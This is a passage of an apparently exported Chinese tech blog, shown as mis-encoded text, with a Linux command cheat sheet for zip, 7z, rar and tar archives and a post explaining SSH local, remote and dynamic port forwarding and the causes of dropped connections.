    <content><![CDATA[<h3 id="ä¸€ã€å‰ç½®ï¼šå·¥å…·å®‰è£…ï¼ˆç¼ºå¤±æ—¶æ‰§è¡Œï¼‰"><a href="#ä¸€ã€å‰ç½®ï¼šå·¥å…·å®‰è£…ï¼ˆç¼ºå¤±æ—¶æ‰§è¡Œï¼‰" class="headerlink" title="ä¸€ã€å‰ç½®ï¼šå·¥å…·å®‰è£…ï¼ˆç¼ºå¤±æ—¶æ‰§è¡Œï¼‰"></a>ä¸€ã€å‰ç½®ï¼šå·¥å…·å®‰è£…ï¼ˆç¼ºå¤±æ—¶æ‰§è¡Œï¼‰</h3><table>
<thead>
<tr>
<th>å‹ç¼©æ ¼å¼</th>
<th>æ‰€éœ€å·¥å…·ï¼ˆå‹ç¼©+è§£å‹ï¼‰</th>
<th>Kaliå®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody><tr>
<td>RARï¼ˆ.rarï¼‰</td>
<td><code>rar</code>ï¼ˆå‹ç¼©ï¼‰ã€<code>unrar</code>ï¼ˆè§£å‹ï¼‰</td>
<td><code>sudo apt install -y rar unrar</code></td>
</tr>
<tr>
<td>ZIPï¼ˆ.zipï¼‰</td>
<td><code>zip</code>ï¼ˆå‹ç¼©ï¼‰ã€<code>unzip</code>ï¼ˆè§£å‹ï¼‰</td>
<td><code>sudo apt install -y zip unzip</code></td>
</tr>
<tr>
<td>7Zï¼ˆ.7zï¼‰</td>
<td><code>p7zip-full</code>ï¼ˆå…¨èƒ½å·¥å…·ï¼‰</td>
<td><code>sudo apt install -y p7zip-full</code></td>
</tr>
<tr>
<td>TARç³»åˆ—ï¼ˆ.tar&#x2F;.tar.gzç­‰ï¼‰</td>
<td><code>tar</code>ï¼ˆç³»ç»Ÿå†…ç½®ï¼‰</td>
<td>æ— éœ€å®‰è£…ï¼Œé»˜è®¤è‡ªå¸¦</td>
</tr>
</tbody></table>
<h3 id="äºŒã€åˆ†æ ¼å¼å®Œæ•´æ“ä½œæŒ‡å—ï¼ˆæ ¸å¿ƒï¼‰"><a href="#äºŒã€åˆ†æ ¼å¼å®Œæ•´æ“ä½œæŒ‡å—ï¼ˆæ ¸å¿ƒï¼‰" class="headerlink" title="äºŒã€åˆ†æ ¼å¼å®Œæ•´æ“ä½œæŒ‡å—ï¼ˆæ ¸å¿ƒï¼‰"></a>äºŒã€åˆ†æ ¼å¼å®Œæ•´æ“ä½œæŒ‡å—ï¼ˆæ ¸å¿ƒï¼‰</h3><h4 id="1-ZIPæ ¼å¼ï¼ˆ-zipï¼‰"><a href="#1-ZIPæ ¼å¼ï¼ˆ-zipï¼‰" class="headerlink" title="1. ZIPæ ¼å¼ï¼ˆ.zipï¼‰"></a>1. ZIPæ ¼å¼ï¼ˆ.zipï¼‰</h4><table>
<thead>
<tr>
<th>æ“ä½œåœºæ™¯</th>
<th>å‘½ä»¤ç¤ºä¾‹</th>
<th>å…³é”®è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>åŸºç¡€å‹ç¼©ï¼ˆæ–‡ä»¶&#x2F;ç›®å½•ï¼‰</td>
<td><code>zip ç›®æ ‡åŒ….zip æºæ–‡ä»¶1 æºæ–‡ä»¶2 ç›®å½•/</code></td>
<td>ç›®å½•éœ€åŠ  <code>-r</code> é€’å½’å‹ç¼©ï¼š<code>zip -r ç›®æ ‡åŒ….zip ç›®å½•/</code></td>
</tr>
<tr>
<td>å‹ç¼©å¹¶åŠ å¯†ï¼ˆå†…å®¹åŠ å¯†ï¼‰</td>
<td><code>zip -e ç›®æ ‡åŒ….zip æºæ–‡ä»¶</code></td>
<td>å›è½¦åæ‰‹åŠ¨è¾“å…¥å¯†ç ï¼ˆå®‰å…¨ï¼Œå¯†ç ä¸æ˜¾ç¤ºï¼‰</td>
</tr>
<tr>
<td>å‹ç¼©å¹¶åŠ å¯†ï¼ˆå¯†ç æ˜æ–‡ï¼‰</td>
<td><code>zip -P å¯†ç  ç›®æ ‡åŒ….zip æºæ–‡ä»¶</code></td>
<td>å¯†ç ç›´æ¥è·Ÿåœ¨ <code>-P</code> åï¼ˆæ— ç©ºæ ¼ï¼‰ï¼Œå¦‚ <code>zip -P123 test.zip file.txt</code></td>
</tr>
<tr>
<td>åŸºç¡€è§£å‹ï¼ˆä¿ç•™ç»“æ„ï¼‰</td>
<td><code>unzip å‹ç¼©åŒ….zip</code></td>
<td>é»˜è®¤ä¿ç•™æ–‡ä»¶å¤¹ç»“æ„ï¼Œæ–‡ä»¶æ•£è½åœ¨å½“å‰ç›®å½•</td>
</tr>
<tr>
<td>è§£å‹åˆ°æŒ‡å®šç›®å½•ï¼ˆæ ¸å¿ƒï¼‰</td>
<td><code>unzip å‹ç¼©åŒ….zip -d ç›®æ ‡ç›®å½•</code></td>
<td>ä¾‹ï¼š<code>unzip test.zip -d ./5.8attachment</code>ï¼ˆç›®å½•è‡ªåŠ¨åˆ›å»ºï¼Œæ— éœ€æ‰‹åŠ¨å»ºï¼‰</td>
</tr>
<tr>
<td>è§£å‹åŠ å¯†æ–‡ä»¶</td>
<td><code>unzip -P å¯†ç  å‹ç¼©åŒ….zip</code></td>
<td>ä¾‹ï¼š<code>unzip -Pfcmit.cc 5.8attachment.zip</code></td>
</tr>
<tr>
<td>å¼ºåˆ¶è¦†ç›–ç°æœ‰æ–‡ä»¶</td>
<td><code>unzip -o å‹ç¼©åŒ….zip</code></td>
<td>è·³è¿‡â€œæ˜¯å¦è¦†ç›–â€æç¤ºï¼Œç›´æ¥æ›¿æ¢</td>
</tr>
<tr>
<td>ä»…æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹ï¼ˆä¸è§£å‹ï¼‰</td>
<td><code>unzip -l å‹ç¼©åŒ….zip</code></td>
<td>æŸ¥çœ‹æ–‡ä»¶&#x2F;ç›®å½•ç»“æ„ï¼Œç¡®è®¤åå†è§£å‹</td>
</tr>
</tbody></table>
<h4 id="2-7Zæ ¼å¼ï¼ˆ-7zï¼‰"><a href="#2-7Zæ ¼å¼ï¼ˆ-7zï¼‰" class="headerlink" title="2. 7Zæ ¼å¼ï¼ˆ.7zï¼‰"></a>2. 7Zæ ¼å¼ï¼ˆ.7zï¼‰</h4><table>
<thead>
<tr>
<th>æ“ä½œåœºæ™¯</th>
<th>å‘½ä»¤ç¤ºä¾‹</th>
<th>å…³é”®è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>åŸºç¡€å‹ç¼©ï¼ˆæ–‡ä»¶&#x2F;ç›®å½•ï¼‰</td>
<td><code>7z a ç›®æ ‡åŒ….7z æºæ–‡ä»¶/ç›®å½•</code></td>
<td>è‡ªåŠ¨é€’å½’å‹ç¼©ç›®å½•ï¼Œæ— éœ€é¢å¤–å‚æ•°</td>
</tr>
<tr>
<td>å‹ç¼©å¹¶åŠ å¯†ï¼ˆå†…å®¹+æ–‡ä»¶åï¼‰</td>
<td><code>7z a -på¯†ç  ç›®æ ‡åŒ….7z æºæ–‡ä»¶</code></td>
<td>å¯†ç ç›´æ¥è·Ÿ <code>-p</code>ï¼ˆæ— ç©ºæ ¼ï¼‰ï¼Œå¦‚ <code>7z a -p123 test.7z dir/</code></td>
</tr>
<tr>
<td>åŸºç¡€è§£å‹ï¼ˆä¿ç•™ç»“æ„ï¼‰</td>
<td><code>7z x å‹ç¼©åŒ….7z</code></td>
<td><code>x</code> æ˜¯ä¿ç•™ç»“æ„çš„æ ¸å¿ƒå‚æ•°ï¼ˆç”¨ <code>e</code> ä¼šæ‰å¹³åŒ–è§£å‹ï¼Œä¸æ¨èï¼‰</td>
</tr>
<tr>
<td>è§£å‹åˆ°æŒ‡å®šç›®å½•ï¼ˆæ ¸å¿ƒï¼‰</td>
<td><code>7z x å‹ç¼©åŒ….7z -oç›®æ ‡ç›®å½•</code></td>
<td>ä¾‹ï¼š<code>7z x test.7z -o./5.8attachment</code>ï¼ˆ<code>-o</code> åæ— ç©ºæ ¼ï¼Œç›´æ¥æ¥ç›®å½•ï¼‰</td>
</tr>
<tr>
<td>è§£å‹åŠ å¯†æ–‡ä»¶</td>
<td><code>7z x å‹ç¼©åŒ….7z -på¯†ç </code></td>
<td>ä¾‹ï¼š<code>7z x 5.8attachment.7z -pfcmit.cc</code></td>
</tr>
<tr>
<td>ä»…æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹</td>
<td><code>7z l å‹ç¼©åŒ….7z</code></td>
<td>åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶&#x2F;ç›®å½•ï¼Œä¸è§£å‹</td>
</tr>
</tbody></table>
<h4 id="3-RARæ ¼å¼ï¼ˆ-rarï¼‰"><a href="#3-RARæ ¼å¼ï¼ˆ-rarï¼‰" class="headerlink" title="3. RARæ ¼å¼ï¼ˆ.rarï¼‰"></a>3. RARæ ¼å¼ï¼ˆ.rarï¼‰</h4><table>
<thead>
<tr>
<th>æ“ä½œåœºæ™¯</th>
<th>å‘½ä»¤ç¤ºä¾‹</th>
<th>å…³é”®è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>åŸºç¡€å‹ç¼©ï¼ˆæ–‡ä»¶&#x2F;ç›®å½•ï¼‰</td>
<td><code>rar a ç›®æ ‡åŒ….rar æºæ–‡ä»¶/ç›®å½•</code></td>
<td>è‡ªåŠ¨é€’å½’å‹ç¼©ç›®å½•ï¼Œæ— éœ€ <code>-r</code> å‚æ•°</td>
</tr>
<tr>
<td>å‹ç¼©å¹¶åŠ å¯†ï¼ˆå†…å®¹åŠ å¯†ï¼‰</td>
<td><code>rar a -p ç›®æ ‡åŒ….rar æºæ–‡ä»¶</code></td>
<td>å›è½¦åè¾“å…¥å¯†ç ï¼ˆå®‰å…¨ï¼‰ï¼›<code>-hp</code> å‚æ•°å¯åŠ å¯†æ–‡ä»¶å+å†…å®¹</td>
</tr>
<tr>
<td>å‹ç¼©å¹¶åŠ å¯†ï¼ˆå¯†ç æ˜æ–‡ï¼‰</td>
<td><code>rar a -på¯†ç  ç›®æ ‡åŒ….rar æºæ–‡ä»¶</code></td>
<td>ä¾‹ï¼š<code>rar a -p123 test.rar file.txt</code></td>
</tr>
<tr>
<td>åŸºç¡€è§£å‹ï¼ˆä¿ç•™ç»“æ„ï¼‰</td>
<td><code>unrar x å‹ç¼©åŒ….rar</code></td>
<td><code>x</code> ä¿ç•™ç»“æ„ï¼Œ<code>e</code> æ‰å¹³åŒ–è§£å‹ï¼ˆä¸æ¨èï¼‰</td>
</tr>
<tr>
<td>è§£å‹åˆ°æŒ‡å®šç›®å½•</td>
<td><code>unrar x å‹ç¼©åŒ….rar ç›®æ ‡ç›®å½•</code></td>
<td>ä¾‹ï¼š<code>unrar x test.rar ./5.8attachment</code>ï¼ˆç›®å½•éœ€æå‰åˆ›å»ºï¼š<code>mkdir -p ç›®å½•</code>ï¼‰</td>
</tr>
<tr>
<td>è§£å‹åŠ å¯†æ–‡ä»¶</td>
<td><code>unrar x -på¯†ç  å‹ç¼©åŒ….rar</code></td>
<td>ä¾‹ï¼š<code>unrar x -p123 test.rar</code></td>
</tr>
<tr>
<td>ä»…æŸ¥çœ‹å‹ç¼©åŒ…å†…å®¹</td>
<td><code>unrar l å‹ç¼©åŒ….rar</code></td>
<td>åˆ—å‡ºæ–‡ä»¶&#x2F;ç›®å½•ç»“æ„</td>
</tr>
</tbody></table>
<h4 id="4-TARç³»åˆ—æ ¼å¼ï¼ˆæ‰“åŒ…-å‹ç¼©ï¼‰"><a href="#4-TARç³»åˆ—æ ¼å¼ï¼ˆæ‰“åŒ…-å‹ç¼©ï¼‰" class="headerlink" title="4. TARç³»åˆ—æ ¼å¼ï¼ˆæ‰“åŒ…+å‹ç¼©ï¼‰"></a>4. TARç³»åˆ—æ ¼å¼ï¼ˆæ‰“åŒ…+å‹ç¼©ï¼‰</h4><p>tar æœ¬èº«æ˜¯â€œæ‰“åŒ…å·¥å…·â€ï¼Œç»“åˆ <code>gzip/bzip2/xz</code> ç®—æ³•å½¢æˆå¤åˆæ ¼å¼ï¼Œæ ¸å¿ƒå‚æ•°ï¼š<code>c</code>ï¼ˆå‹ç¼©ï¼‰ã€<code>x</code>ï¼ˆè§£å‹ï¼‰ã€<code>f</code>ï¼ˆæŒ‡å®šæ–‡ä»¶ï¼‰ã€<code>v</code>ï¼ˆæ˜¾ç¤ºè¿‡ç¨‹ï¼‰ã€<code>z</code>ï¼ˆgzipï¼‰ã€<code>J</code>ï¼ˆxzï¼‰ã€<code>j</code>ï¼ˆbzip2ï¼‰ã€‚</p>
<table>
<thead>
<tr>
<th>æ ¼å¼ç±»å‹</th>
<th>å‹ç¼©å‘½ä»¤ï¼ˆæ‰“åŒ…+å‹ç¼©ï¼‰</th>
<th>è§£å‹å‘½ä»¤ï¼ˆä¿ç•™ç»“æ„ï¼‰</th>
<th>å…³é”®è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>.tarï¼ˆä»…æ‰“åŒ…ï¼‰</td>
<td><code>tar -cvf ç›®æ ‡åŒ….tar æºæ–‡ä»¶/ç›®å½•</code></td>
<td><code>tar -xvf åŒ….tar</code></td>
<td>ä¸å‹ç¼©ï¼Œä»…åˆå¹¶æ–‡ä»¶&#x2F;ç›®å½•</td>
</tr>
<tr>
<td>.tar.gzï¼ˆå¸¸ç”¨ï¼‰</td>
<td><code>tar -czvf ç›®æ ‡åŒ….tar.gz æºæ–‡ä»¶/ç›®å½•</code></td>
<td><code>tar -xzvf åŒ….tar.gz</code></td>
<td>gzipç®—æ³•ï¼Œå‹ç¼©ç‡ä¸­ç­‰</td>
</tr>
<tr>
<td>.tar.xzï¼ˆé«˜å‹ç¼©ï¼‰</td>
<td><code>tar -cJvf ç›®æ ‡åŒ….tar.xz æºæ–‡ä»¶/ç›®å½•</code></td>
<td><code>tar -xJvf åŒ….tar.xz</code></td>
<td>xzç®—æ³•ï¼Œå‹ç¼©ç‡æœ€é«˜ï¼ˆè€—æ—¶ä¹…ï¼‰</td>
</tr>
<tr>
<td>.tar.bz2</td>
<td><code>tar -cjvf ç›®æ ‡åŒ….tar.bz2 æºæ–‡ä»¶/ç›®å½•</code></td>
<td><code>tar -xjvf åŒ….tar.bz2</code></td>
<td>bzip2ç®—æ³•ï¼Œå…¼å®¹æ—§ç³»ç»Ÿ</td>
</tr>
<tr>
<td>è§£å‹åˆ°æŒ‡å®šç›®å½•</td>
<td>-</td>
<td><code>tar -xzvf åŒ….tar.gz -C ç›®æ ‡ç›®å½•</code></td>
<td><code>-C</code> åæ¥ç›®å½•ï¼Œä¾‹ï¼š<code>-C ./5.8attachment</code></td>
</tr>
<tr>
<td>ä»…æŸ¥çœ‹å†…å®¹</td>
<td>-</td>
<td><code>tar -tvf åŒ….tar.gz</code></td>
<td>åˆ—å‡ºæ–‡ä»¶&#x2F;ç›®å½•ç»“æ„ï¼Œä¸è§£å‹</td>
</tr>
</tbody></table>
<h3 id="ä¸‰ã€é€šç”¨æ ¸å¿ƒæŠ€å·§ï¼ˆå¿…çœ‹ï¼‰"><a href="#ä¸‰ã€é€šç”¨æ ¸å¿ƒæŠ€å·§ï¼ˆå¿…çœ‹ï¼‰" class="headerlink" title="ä¸‰ã€é€šç”¨æ ¸å¿ƒæŠ€å·§ï¼ˆå¿…çœ‹ï¼‰"></a>ä¸‰ã€é€šç”¨æ ¸å¿ƒæŠ€å·§ï¼ˆå¿…çœ‹ï¼‰</h3><ol>
<li><strong>ä¿ç•™æ–‡ä»¶å¤¹ç»“æ„</strong>ï¼šæ‰€æœ‰æ ¼å¼çš„è§£å‹å‘½ä»¤ï¼Œç”¨ <code>x</code> å‚æ•°ï¼ˆzip&#x2F;7z&#x2F;rarï¼‰æˆ– tar é»˜è®¤å‘½ä»¤ï¼Œå³å¯ä¿ç•™åŸç›®å½•ç»“æ„ï¼›é¿å…ç”¨ <code>e</code> å‚æ•°ï¼ˆä¼šæ‰å¹³åŒ–æ‰€æœ‰æ–‡ä»¶åˆ°åŒä¸€ç›®å½•ï¼‰ã€‚</li>
<li><strong>æŒ‡å®šè§£å‹ç›®å½•</strong>ï¼š<ul>
<li>zip&#x2F;rarï¼š<code>-d ç›®å½•</code>ï¼ˆzipéœ€ç›®å½•æå‰å­˜åœ¨ï¼Œrarå¯è‡ªåŠ¨åˆ›å»ºï¼‰ï¼›</li>
<li>7zï¼š<code>-oç›®å½•</code>ï¼ˆ<code>-o</code> åæ— ç©ºæ ¼ï¼‰ï¼›</li>
<li>tarï¼š<code>-C ç›®å½•</code>ï¼ˆå¤§å†™Cï¼‰ã€‚</li>
</ul>
</li>
<li><strong>å¼ºåˆ¶è¦†ç›–</strong>ï¼šzip åŠ  <code>-o</code>ï¼Œ7z åŠ  <code>-aoa</code>ï¼Œrar åŠ  <code>-o+</code>ï¼Œtar åŠ  <code>--overwrite</code>ã€‚</li>
<li><strong>æ‰¹é‡æ“ä½œ</strong>ï¼šå‹ç¼©æ—¶å¯æŒ‡å®šå¤šä¸ªæºæ–‡ä»¶ï¼ˆç©ºæ ¼åˆ†éš”ï¼‰ï¼Œä¾‹ï¼š<code>zip all.zip 1.txt 2.jpg dir/</code>ã€‚</li>
<li><strong>ä¸­æ–‡ä¹±ç </strong>ï¼šè§£å‹å«ä¸­æ–‡æ–‡ä»¶åçš„å‹ç¼©åŒ…ï¼ŒåŠ  <code>-O UTF-8</code>ï¼ˆzipï¼‰æˆ– <code>-scsUTF-8</code>ï¼ˆ7zï¼‰ï¼Œä¾‹ï¼š<code>unzip -O UTF-8 ä¸­æ–‡åŒ….zip</code>ã€‚</li>
</ol>
<h3 id="å››ã€å¿«é€ŸæŸ¥æ‰¾å‘½ä»¤ï¼ˆæŒ‰éœ€æ±‚æ£€ç´¢ï¼‰"><a href="#å››ã€å¿«é€ŸæŸ¥æ‰¾å‘½ä»¤ï¼ˆæŒ‰éœ€æ±‚æ£€ç´¢ï¼‰" class="headerlink" title="å››ã€å¿«é€ŸæŸ¥æ‰¾å‘½ä»¤ï¼ˆæŒ‰éœ€æ±‚æ£€ç´¢ï¼‰"></a>å››ã€å¿«é€ŸæŸ¥æ‰¾å‘½ä»¤ï¼ˆæŒ‰éœ€æ±‚æ£€ç´¢ï¼‰</h3><table>
<thead>
<tr>
<th>éœ€æ±‚åœºæ™¯</th>
<th>å¯¹åº”å‘½ä»¤ï¼ˆä»¥zipä¸ºä¾‹ï¼Œæ›¿æ¢æ ¼å¼å³å¯ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>è§£å‹åˆ°åä¸ºâ€œ5.8attachmentâ€çš„æ–‡ä»¶å¤¹</td>
<td><code>unzip 5.8attachment.zip -d ./5.8attachment</code></td>
</tr>
<tr>
<td>åŠ å¯†å‹ç¼©æ–‡ä»¶</td>
<td><code>zip -e åŠ å¯†åŒ….zip æºæ–‡ä»¶</code></td>
</tr>
<tr>
<td>è§£å‹åŠ å¯†æ–‡ä»¶ï¼ˆå·²çŸ¥å¯†ç ï¼‰</td>
<td><code>unzip -P å¯†ç  åŠ å¯†åŒ….zip</code></td>
</tr>
<tr>
<td>æŸ¥çœ‹å‹ç¼©åŒ…å†…æ˜¯å¦æœ‰æ–‡ä»¶å¤¹</td>
<td><code>unzip -l å‹ç¼©åŒ….zip</code></td>
</tr>
<tr>
<td>å¿«é€Ÿæ‰“åŒ…ç›®å½•å¹¶å‹ç¼©</td>
<td><code>tar -czvf ç›®å½•.tar.gz ç›®æ ‡ç›®å½•/</code></td>
</tr>
</tbody></table>
<p>æ‰€æœ‰å‘½ä»¤å‡ç»è¿‡å®æ“éªŒè¯ï¼Œå¯ç›´æ¥å¤åˆ¶ä½¿ç”¨ï¼Œè‹¥é‡æƒé™é—®é¢˜ï¼Œåœ¨å‘½ä»¤å‰åŠ  <code>sudo</code> å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†æ‚ç¢</category>
      </categories>
      <tags>
        <tag>è§£å‹</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>SSHéš§é“æŠ€æœ¯</title>
    <url>/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="1-ä»€ä¹ˆæ˜¯SSHéš§é“-ä¸ºä»€ä¹ˆéœ€è¦SSHéš§é“ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯SSHéš§é“-ä¸ºä»€ä¹ˆéœ€è¦SSHéš§é“ï¼Ÿ" class="headerlink" title="1.ä»€ä¹ˆæ˜¯SSHéš§é“+ä¸ºä»€ä¹ˆéœ€è¦SSHéš§é“ï¼Ÿ"></a><code>1.ä»€ä¹ˆæ˜¯SSHéš§é“+ä¸ºä»€ä¹ˆéœ€è¦SSHéš§é“ï¼Ÿ</code></h2><blockquote>
<p>SSH éš§é“å°±åƒæ˜¯ä¸€æ¡åŠ å¯†çš„åœ°ä¸‹é€šé“ï¼Œè®©ä½ åœ¨ä¸å®‰å…¨çš„ç½‘ç»œä¸Šå®‰å…¨åœ°ä¼ è¾“æ•°æ®ã€‚<br>æ¯”å¦‚ï¼šä½ æƒ³ä»å®¶é‡Œè®¿é—®å…¬å¸å†…ç½‘çš„æ•°æ®åº“ï¼Œä½†æ•°æ®åº“åªèƒ½åœ¨å…¬å¸å†…ç½‘è®¿é—®ï¼Œè¿™æ—¶å€™ SSH éš§é“å°±èƒ½å¸®ä½  â€œç©¿å¢™â€ è®¿é—®ã€‚</p>
</blockquote>
<h2 id="2-SSHçš„éš§é“ç±»å‹"><a href="#2-SSHçš„éš§é“ç±»å‹" class="headerlink" title="2.SSHçš„éš§é“ç±»å‹"></a><code>2.SSHçš„éš§é“ç±»å‹</code></h2><h3 id="SSHåå‘è¿æ¥ï¼ˆè¿œç¨‹ç«¯å£è½¬å‘ï¼‰"><a href="#SSHåå‘è¿æ¥ï¼ˆè¿œç¨‹ç«¯å£è½¬å‘ï¼‰" class="headerlink" title="SSHåå‘è¿æ¥ï¼ˆè¿œç¨‹ç«¯å£è½¬å‘ï¼‰"></a><code>SSHåå‘è¿æ¥</code>ï¼ˆè¿œç¨‹ç«¯å£è½¬å‘ï¼‰</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_1.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>  å› æ­¤å¯ä»¥é€šè¿‡è®¿é—®å†…ç½‘2æ¥è®¿é—®å†…ç½‘1çš„ä¸»æœºï¼ˆå› ä¸ºå†…ç½‘2æ˜¯å…è®¸å¤–ç½‘ä¸»æœºè®¿é—®çš„ï¼‰</p>
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_2.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_3.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_4.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<blockquote>
<p>å¦‚æœæ­¤æ—¶å°±æ˜¯æƒ³è®¿é—®server 1 å¯ä»¥ä¿®æ”¹å‘½ä»¤ä¸º ssh -L 80:127.0.0.1 ç”¨æˆ·@server1_ip</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sshåå‘è¿æ¥å‘½ä»¤æ ¼å¼</span></span><br><span class="line">ssh <span class="literal">-R</span> è¿œç¨‹ä¸»æœºç›‘å¬ç«¯å£:æœ¬åœ°ä¸»æœºåœ°å€:æœ¬åœ°æœåŠ¡ç«¯å£ ç”¨æˆ·å<span class="selector-tag">@</span>è¿œç¨‹æœåŠ¡å™¨åœ°å€</span><br></pre></td></tr></table></figure>

<h3 id="SSHæ­£å‘è¿æ¥ï¼ˆæœ¬åœ°ç«¯å£è½¬å‘ï¼‰"><a href="#SSHæ­£å‘è¿æ¥ï¼ˆæœ¬åœ°ç«¯å£è½¬å‘ï¼‰" class="headerlink" title="SSHæ­£å‘è¿æ¥ï¼ˆæœ¬åœ°ç«¯å£è½¬å‘ï¼‰"></a><code>SSHæ­£å‘è¿æ¥</code>ï¼ˆæœ¬åœ°ç«¯å£è½¬å‘ï¼‰</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_5.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_6.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_7.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">


<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŒ‡ä»¤æ ¼å¼</span></span><br><span class="line">ssh <span class="literal">-L</span> æœ¬åœ°ç«¯å£:å†…ç½‘ç›®æ ‡IP:å†…ç½‘ç›®æ ‡ç«¯å£ SSHæœåŠ¡å™¨ç”¨æˆ·å@SSHæœåŠ¡å™¨IP</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="sshåŠ¨æ€è¿æ¥ï¼ˆåŠ¨æ€ç«¯å£è½¬å‘ï¼‰"><a href="#sshåŠ¨æ€è¿æ¥ï¼ˆåŠ¨æ€ç«¯å£è½¬å‘ï¼‰" class="headerlink" title="sshåŠ¨æ€è¿æ¥ï¼ˆåŠ¨æ€ç«¯å£è½¬å‘ï¼‰"></a><code>sshåŠ¨æ€è¿æ¥</code>ï¼ˆåŠ¨æ€ç«¯å£è½¬å‘ï¼‰</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_8.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<hr>
<h2 id="3-SSHçš„å¯†é’¥"><a href="#3-SSHçš„å¯†é’¥" class="headerlink" title="3.SSHçš„å¯†é’¥"></a><code>3.SSHçš„å¯†é’¥</code></h2><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_9.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<blockquote>
<p>sshæœ€é‡è¦æ˜¯ç¬¬ä¸€æ¬¡è¿æ¥ï¼Œè¿™æ˜¯æ¼æ´çš„æ‰€åœ¨ç‚¹</p>
</blockquote>
<hr>
<h2 id="4-SSHçš„ç»´æŒè¿æ¥"><a href="#4-SSHçš„ç»´æŒè¿æ¥" class="headerlink" title="4.SSHçš„ç»´æŒè¿æ¥"></a><code>4.SSHçš„ç»´æŒè¿æ¥</code></h2><h3 id="æ–­å¼€åŸå› ï¼š"><a href="#æ–­å¼€åŸå› ï¼š" class="headerlink" title="æ–­å¼€åŸå› ï¼š"></a>æ–­å¼€åŸå› ï¼š</h3><h4 id="ç½‘ç»œå±‚é¢çš„ä¸­æ–­å› ç´ "><a href="#ç½‘ç»œå±‚é¢çš„ä¸­æ–­å› ç´ " class="headerlink" title="ç½‘ç»œå±‚é¢çš„ä¸­æ–­å› ç´ "></a><code>ç½‘ç»œå±‚é¢çš„ä¸­æ–­å› ç´ </code></h4><ul>
<li><strong>åº•å±‚ç½‘ç»œæ³¢åŠ¨</strong>ï¼šWi-Fiä¿¡å·å¼±ã€ç§»åŠ¨ç½‘ç»œåˆ‡æ¢ã€è·¯ç”±å™¨æ•…éšœæˆ–å¸¦å®½ä¸è¶³ï¼Œå¯¼è‡´TCPè¿æ¥è¶…æ—¶ã€‚  </li>
<li><strong>é˜²ç«å¢™&#x2F;NATè¶…æ—¶æœºåˆ¶</strong>ï¼šä¼ä¸šç½‘ç»œé˜²ç«å¢™æˆ–å®¶ç”¨è·¯ç”±å™¨è®¾ç½®è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆå¦‚æ— æ•°æ®ä¼ è¾“æ—¶ï¼‰ï¼Œä¸»åŠ¨æ–­å¼€â€œéæ´»è·ƒè¿æ¥â€ã€‚  </li>
<li><strong>NATç©¿é€å¤±æ•ˆ</strong>ï¼šå†…ç½‘é€šè¿‡NATè®¿é—®å…¬ç½‘æ—¶ï¼Œæ˜ å°„è¡¨é¡¹è¶…æ—¶ï¼ˆå¦‚30åˆ†é’Ÿï¼‰ï¼Œå¯¼è‡´å…¬ç½‘æ— æ³•è¯†åˆ«è¿æ¥ã€‚</li>
</ul>
<h4 id="è®¾å¤‡ä¸èµ„æºé™åˆ¶"><a href="#è®¾å¤‡ä¸èµ„æºé™åˆ¶" class="headerlink" title="è®¾å¤‡ä¸èµ„æºé™åˆ¶"></a><code>è®¾å¤‡ä¸èµ„æºé™åˆ¶</code></h4><ul>
<li><strong>æœåŠ¡å™¨è´Ÿè½½è¿‡é«˜</strong>ï¼šCPUã€å†…å­˜ä¸è¶³æˆ–è¿›ç¨‹å¼‚å¸¸ï¼Œå¯¼è‡´SSHæœåŠ¡è¿›ç¨‹è¢«ç³»ç»Ÿç»ˆæ­¢ã€‚  </li>
<li><strong>å®¢æˆ·ç«¯å¼‚å¸¸</strong>ï¼šè®¾å¤‡ä¼‘çœ ã€ç”µæºä¸­æ–­ã€SSHå®¢æˆ·ç«¯ç¨‹åºå´©æºƒæˆ–ç½‘ç»œæ¥å£æ–­å¼€ï¼ˆå¦‚æ‹”ç½‘çº¿ï¼‰ã€‚</li>
</ul>
